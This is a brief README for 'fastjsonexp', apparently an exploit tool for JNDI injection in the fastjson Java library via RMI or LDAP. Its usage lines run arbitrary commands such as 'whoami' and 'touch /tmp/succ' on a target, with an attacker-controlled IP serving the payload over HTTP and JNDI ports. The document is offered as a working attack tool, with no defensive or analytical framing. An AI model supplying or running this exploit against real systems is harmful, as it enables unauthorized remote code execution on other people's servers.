# fastjsonexp

fastjson jndi injection 
rmi/ldap 

## how to use
```
test.py -c <comand> -i <hostip> -t <rmi/ldap> --httpport <httpport> --jndiport <jndiport>

python fastjsonexp.py -c "whoami" -i 30.1.2.222 -t rmi  --httpport 8888  --jndiport 9999

python fastjsonexp.py -c "touch /tmp/succ" -i 30.1.2.222 -t ldap  --httpport 8888  --jndiport 9999
```
